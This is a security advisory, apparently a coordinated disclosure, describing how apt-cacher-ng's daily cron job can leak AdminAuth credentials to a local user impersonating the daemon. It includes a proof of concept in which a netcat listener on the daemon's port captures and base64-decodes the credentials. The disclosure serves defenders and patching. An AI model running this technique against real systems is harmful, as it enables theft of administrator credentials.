In the course of a code review of apt-cacher-ng I noticed a possible credentials leak when "AdminAuth" is enabled in /etc/apt-cacher-ng/security.conf.  The apt-cacher-ng daemon listens on TCP port on all network interfaces but also creates a UNIX domain socket in /run/apt-cacher-ng/socket. The cron job script /etc/cron.daily/apt-cacher-ng runs the following command:  /usr/lib/apt-cacher-ng/acngtool maint -c /etc/apt-cacher-ng SocketPath=/var/run/apt-cacher-ng/socket  SocketPath is explicitly specified on the command line, trying to force a connection to the daemon via the socket path. However, `acngtool` does not act accordingly. Instead, when using the default configuration, it connects to This stems from the source file (based on apt-cacher-ng 3.1 that I have looked into), where the following is found:  ``` 	auto nips = Tokenize(cfg::bindaddr, SPACECHARS, hostips, true); 	if (!nips) 		hostips.emplace_back("localhost"); ```  Since port is not a privileged network port, any local user may bind to this port. Should the actual apt-cacher-ng daemon not (yet) be running, a local unprivileged user can impersonate the daemon, and the cron.daily/apt-cacher-ng script will sooner or later pass the AdminAuth credentials to it. This is the proof of concept I tested on Debian 9:  ``` # make sure AdminAuth is enabled root # grep AdminAuth /etc/apt-cacher-ng/security.conf  AdminAuth: mooma:moopa  # simulate the apt-cacher-ng daemon not running root # systemctl stop apt-cacher-ng  # in a second shell run netcat as a regular user on port user $ nc -l -p  # simulate the cron job being executed root # /etc/cron.daily/apt-cacher-ng  # now you should see the following output in the netcat shell  GET /acng-report.html?doExpire=Start%2bExpiration&abortOnErrors=aOe HTTP/1.1 User-Agent: Debian Apt-Cacher-NG/2 Host: localhost Authorization: Basic Cache-Control: no-store,no-cache,max-age=0 Accept: application/octet-stream Accept-Encoding: identity Connection: close ```  # base64 decoding the auth data, the local unprivileged user obtained # the authentication data for apt-cacher-ng user $ echo | base64 -d mooma:moopa ```  The issue is more severe in the openSUSE packaging where the apt-cacher-ng daemon is not started by default, but only by explicit Administrator configuration, which results in the attack surface being exposed by default. But also when apt-cacher-ng crashes or can be crashed by a local attacker, the information leak could be achieved.  Debian Upstream has already published an update with a suitable bugfix for Debian sid [2]. I've informed the upstream author on about this issue, the Debian security team was involved, patches reviewed and agreed upon.
